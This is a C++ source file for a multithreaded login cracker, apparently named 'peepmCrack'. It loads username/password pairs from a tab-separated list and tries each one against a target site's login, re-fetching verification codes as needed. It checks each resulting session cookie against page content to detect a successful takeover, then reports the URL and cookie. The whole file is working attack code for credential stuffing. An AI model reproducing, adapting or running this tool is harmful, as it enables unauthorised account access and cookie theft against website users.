#include "StdAfx.h"
#include "UrlBrowser.h"
#include "peepmUtil.h"
#include "peepmCrack.h"

CUrlBrowser::CUrlBrowser(PeepmBrowser* peepmBrowser, char* url, BOOL* success, UINT id, UINT threadMax, DWORD delay, CCriticalSection* section, CEvent* event, PeepmWrite* peepmWrite, CpeepmUI& peepmUI) : CpeepmCrack(id, threadMax, delay, section, event, peepmWrite, peepmUI)
{
	m_PeepmBrowser = peepmBrowser;
	m_PeepmAccount = m_PeepmBrowser;
	m_Url = url;
	m_Success = success;
}

CUrlBrowser::~CUrlBrowser()
{

}

BOOL CUrlBrowser::OnStarted()
{
	if (!InitSocket())
		return FALSE;

	ConnectSocket();
	if (!GetCode())
		return FALSE;

	if (!GetPeepmAccount())
		return FALSE;
	
	return TRUE;
}

BOOL CUrlBrowser::OnProgress()
{	
	if (*m_Success)
		return FALSE;

	PeepmBrowser* peepmAccount = GetAccount();
	if (peepmAccount != NULL)
	{
		char* username = peepmAccount->username;
		char* password = peepmAccount->password;
		m_PeepmUI.OnThreadProgress(m_Id, username, password, NULL);

		UINT ret = GetLogin(username, password, FALSE);
		if (ret == 2)
		{
			if (GetCode())
				return TRUE;
			else
				return FALSE;
		}

		if (ret == 0)
		{
			char* cookie = GetCookies();
			BOOL success = CheckContent(cookie);
			if (success)
			{
				m_PeepmUI.OnThreadBrowser(m_Url, cookie);
				*m_Success = TRUE;				
			}

			ReleaseArray(cookie);
			if (success)
				return FALSE;
		}

		if (!GetPeepmAccount())
			return FALSE;
	}

	return TRUE;
}

BOOL CUrlBrowser::CheckContent(const char* cookie)
{
	if (!GetUrlContent(m_Url, cookie))
		return FALSE;

	const Response& response = GetReponse();
	UINT length = m_Response.bodyLength;
	if (length > 0)
	{
		char* p = strstr(response.body, RegexContent2);
		if (p != NULL)
			return FALSE;

		p = strstr(response.body, RegexContent1);
		if (p == NULL)
			return TRUE;
		else
			return FALSE;
	}
	else
		return FALSE;	
}

void CUrlBrowser::OnStoped()
{

}

void CUrlBrowser::OnRelease()
{
	ReleaseArray(m_Url);
	ReleaseObject(m_Success);
	PeepmBrowser* peepmAccount = m_PeepmBrowser;
	if (peepmAccount != NULL)
	{
		CCriticalSection* section = peepmAccount->section;
		ReleaseObject(section);

		while (peepmAccount != NULL)
		{
			ReleaseArray(peepmAccount->username);
			ReleaseArray(peepmAccount->password);
			PeepmBrowser* current = peepmAccount;
			peepmAccount = peepmAccount->next;
			ReleaseObject(current);
		}
	}
}

BOOL CUrlBrowser::GetSuccess()
{
	return *m_Success;
}

PeepmBrowser* CUrlBrowser::GetPeepmBrowser()
{
	return m_PeepmBrowser;
}

BOOL CUrlBrowser::GetPeepmAccount()
{
	PeepmBrowser* peepmAccount = GetAccount();
	CCriticalSection* section = peepmAccount->section;
	if (!section->Lock())
		return FALSE;

	while (peepmAccount->use)
	{
		peepmAccount = peepmAccount->next;
		if (peepmAccount == NULL)
		{
			section->Unlock();
			return FALSE;
		}
	}	

	peepmAccount->use = TRUE;
	SetAccount(peepmAccount);
	section->Unlock();

	return TRUE;
}

void CUrlBrowser::SetAccount(PeepmBrowser* peepmBrowser)
{
	m_PeepmAccount = peepmBrowser;
}

PeepmBrowser* CUrlBrowser::GetAccount()
{
	return m_PeepmAccount;
}

UINT CUrlBrowser::InitAccount(LPVOID param)
{
	CUrlBrowser* browser = (CUrlBrowser *)param;
	PeepmBrowser* peepmBrowser = browser->GetPeepmBrowser();
	char* path = peepmBrowser->path;
	UINT threadMax = browser->GetThreadMax();
	CEvent* event = browser->GetEvent();
	FILE* file = fopen(path, "rb");	
	if (file == NULL)
	{
		fclose(file);
		event->SetEvent();

		return 0;
	}

	CCriticalSection* section = new CCriticalSection();		
	PeepmBrowser* prev = NULL;

	char* buffer = new char[readmax + 1];	
	ZeroMemory(buffer, readmax + 1);

	UINT size = readmax;
	long len = 0;
	char* p = buffer;

	while (!feof(file) || len > 0)
	{			
		BOOL flag = FALSE;

		if (len == 0)
		{
			long start = ftell(file);
			int ret = fread(p, size, 1, file);
			long end = ftell(file);
			len = end - start;
			p[len] = '\0';
			len += p - buffer;
			p = buffer;					
		}		

		char* q = p;

		while (q - p < len)
		{
			if (*q == '\r' || *q == '\n')
			{
				if (flag)
					break;			
				else
				{
					p++;					
					len--;					
				}
			}
			else				
				flag = TRUE;

			q++;
		}

		if (flag)
		{	
			if (q - p == len && !feof(file))
			{
				CopyMemory(buffer, p, len);
				p = buffer;				
				p = buffer + len;				
				size = readmax - len;
				len = 0;
				continue;
			}

			UINT total = q - p;
			char* account = new char[total + 1];				
			CopyMemory(account, p, total);
			account[total] = '\0';

			char* username = NULL;

			char* o = account;
			while (o - account < total)
			{
				if (*o == '\t')
				{
					UINT l = o - account;
					username = new char[l + 1];
					ZeroMemory(username, l + 1);
					CopyMemory(username, account, l);
					break;
				}

				o++;
			}

			while (o - account < total)
			{
				if (*o != '\t')
					break;

				o++;
			}

			if (username != NULL)
			{				
				char* x = o;
				UINT l = total - (o - account);
				char* password = new char[l + 1];
				ZeroMemory(password, l + 1);
				CopyMemory(password, o, l);

				if (prev == NULL)
				{
					prev = peepmBrowser;
					prev->username = username;
					prev->password = password;
					prev->use = FALSE;
					prev->section = section;
					prev->next = NULL;
				}
				else
				{
					PeepmBrowser* next = new PeepmBrowser();
					ZeroMemory(next, sizeof(PeepmBrowser));

					next->username = username;
					next->password = password;
					next->use = FALSE;
					next->section = section;
					next->next = NULL;
					prev->next = next;
					prev = next;
				}
			}

			ReleaseArray(account);

			len -= total;
			p = q;
			q++;			
			while (q - p < len)
			{
				if (*q == '\r' || *q == '\n')
					q++;
				else
					break;
			}

			if (q - p < len)
			{
				len = len - (q - p);
				p = q;
				continue;			
			}
		}

		len = 0;
		p = buffer;
		size = readmax;		
	}

	fclose(file);
	ReleaseArray(buffer);
	event->SetEvent();

	return 1;
}